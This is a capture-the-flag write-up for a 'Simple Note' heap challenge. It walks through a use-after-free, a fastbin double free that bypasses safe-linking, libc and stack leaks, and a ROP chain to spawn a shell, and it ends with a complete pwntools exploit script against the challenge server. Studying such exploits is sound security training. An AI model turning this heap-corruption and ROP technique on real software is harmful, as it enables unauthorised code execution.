# Simple Note

author: kuvee
points: 491

the checksec output:
```
  Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

On inspecting the decompilation, we notice:
- We have Use after Free (UAF)
- The pointers are being stored in global array, and we can only have 6 allocations
- allocation is done using calloc() instead of main(), why does this matter? calloc zeroes out space on allocation and the algorithm slightly differs from malloc, so it will be more oriented toward fast-bin attack
- There's a peculiar function on input 9999, which gives a very nice leak
```
Note: something very interesting to see is, if your allocation bin's size has `IS_MMAPED` flag set, then calloc wont zero out its region because it assumes it's already zero-ed out because of mmap
```
```c
unsigned __int64 sub_193C()
{
  void *v1; // [rsp+8h] [rbp-68h] BYREF
  char s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = &unk_4060;
  puts("enter your name: ");
  fgets(s, 80, stdin);
  puts("enter your age: ");
  __isoc99_scanf("%ld", &v1);
  getchar();
  printf("your age: %ld and name: %s\n", v1, s);
  puts("but ... why you here???");
  return v3 - __readfsqword(0x28u);
}
```

When we are doing scanf on `v1` there's no check if it's being taken properly, so if you just give any nonsensical input, it will print the address of `v1` in the printf line which just happens to be pointer in bss area, awesome.

The main idea behind the exploitation is to first get a heap leak to defeat [safe-link](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking) and perform some attack on fastbins to make it return arbitrary pointer,
we want it to be in the BSS area where the array storing the pointers is present, there we can write our own pointers and read/write.

So lets start

- get the pie leak
    ```python
        r.sendlineafter(b'>',b'9999')
        r.sendlineafter(b':',b'a')
        r.sendlineafter(b':',b'aaaaaa')
        r.recvuntil(b'age:')
        exe.address = int(r.recvline().split(b" ")[1].decode())-0x4060
        print(hex(exe.address))
    ```

- get the heap leak
    ```python
        malloc(0x43,b'aaaa')
        free(0)
        heap_leek = unpack(show(0),'all')
    ```
- fill up the tcache without allocating them on pointer array
    ```python
    for i in range(7):
            malloc(0x33,b'')
    ```
    this works because on invalid input, it frees the area and makes the pointer in pointer array NULL


- Now we perform double-free on the fastbin and then change the next pointer to get a controlled pointer in bss area (similar to tcache poinsoning)
    ```python
    malloc(0x33,b'a')
    malloc(0x33,b'b')
    malloc(0x33,b'a')
    free(1)
    free(2)
    free(1)
    st  = (exe.address+0x4080)^(heap_leek)
    edit(1,p64(st))
    malloc(0x33,b'a')
    malloc(0x33,b'a')
    ```
    read this for the [fastbin double free](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/fastbin_dup.c)
    
    It's important to note that my first alloc was 0x43, which is the size that gets stored in the array, this will be acting as the fake fastbin available for use, it's `IS_MMAPED` and `PREV_INUSE` flag will be set due 0x3 (0x2|0x1)
    the allocations after that are 0x33, because allocation algorithm will perform a check on the fastbin size to detect for corruption, 0x33 allocation would go to a bin with 0x40 as size.

- Now we have control over the pointer array with our latest allocation! i'll be leaking the libc and stack address now, by making use of stdout/stdin/stderror file struct pointer in BSS area
    ```python
    edit(5,p64(exe.address+0x4020))
    libc.address = unpack(show(0),'all')-0x2045c0
    edit(5,p64(libc.sym['environ']))
    stack = unpack(show(0),'all')
    print(hex(libc.address))
    print(hex(stack))
    gdb.attach(r)
    rip = stack-0x150
    edit(5,p64(rip))
    ```
    the `environ` symbol in libc contains stack addresses, and `exe.address+0x4020` had one of the file struct pointers in libc

- Now i just do rop
    ```python
    rip = stack-0x150
    edit(5,p64(rip))
    pop_rdi = p64(libc.address+0x10f75b)
    ret = p64(libc.address+0x10f75b+1)
    rop = pop_rdi+p64(next(libc.search(b'/bin/sh'))) + ret+p64(libc.sym.system)
    edit(0,rop)
    ```

and finally get the shell


The solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal =['alacritty','-e','bash','-c']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.blitzhack.xyz",4566)
        context.noptrace=True

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.sendlineafter(b'>',b'9999')
    r.sendlineafter(b':',b'a')
    r.sendlineafter(b':',b'aaaaaa')
    r.recvuntil(b'age:')
    exe.address = int(r.recvline().split(b" ")[1].decode())-0x4060

    print(hex(exe.address))
    def malloc(sz,pl):
        r.sendlineafter(b'>',b'1')
        r.sendlineafter(b':',str(sz).encode())
        r.sendlineafter(b':',pl)

    def edit(idx,pl):
        r.sendlineafter(b'>',b'2')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'2')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode())
        r.sendlineafter(b':',pl)

    def show(idx):
        r.sendlineafter(b'>',b'3')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'3')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode())
        r.recvuntil(b': "')
        return r.recvline().strip()[:-1]

    def free(idx):
        r.sendlineafter(b'>',b'4')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',b'0')
        l = int(r.recvline().split(b" ")[-1].decode())
        r.sendlineafter(b'>',b'4')
        r.sendlineafter(b':',str(idx).encode())
        r.sendlineafter(b':',str(l).encode())

    malloc(0x43,b'aaaa')
    free(0)
    heap_leek = unpack(show(0),'all')
    for i in range(7):
        malloc(0x33,b'')
    print(hex(heap_leek<<12))
    malloc(0x33,b'a')
    malloc(0x33,b'b')
    malloc(0x33,b'a')
    free(1)
    free(2)
    free(1)
    st  = (exe.address+0x4080)^(heap_leek)
    edit(1,p64(st))
    malloc(0x33,b'a')
    malloc(0x33,b'a')

    edit(5,p64(exe.address+0x4020))
    libc.address = unpack(show(0),'all')-0x2045c0
    edit(5,p64(libc.sym['environ']))
    stack = unpack(show(0),'all')
    print(hex(libc.address))
    print(hex(stack))
    gdb.attach(r)
    rip = stack-0x150
    edit(5,p64(rip))
    pop_rdi = p64(libc.address+0x10f75b)
    ret = p64(libc.address+0x10f75b+1)
    rop = pop_rdi+p64(next(libc.search(b'/bin/sh'))) + ret+p64(libc.sym.system)
    edit(0,rop)
    r.interactive()


if __name__ == "__main__":
    main()
```

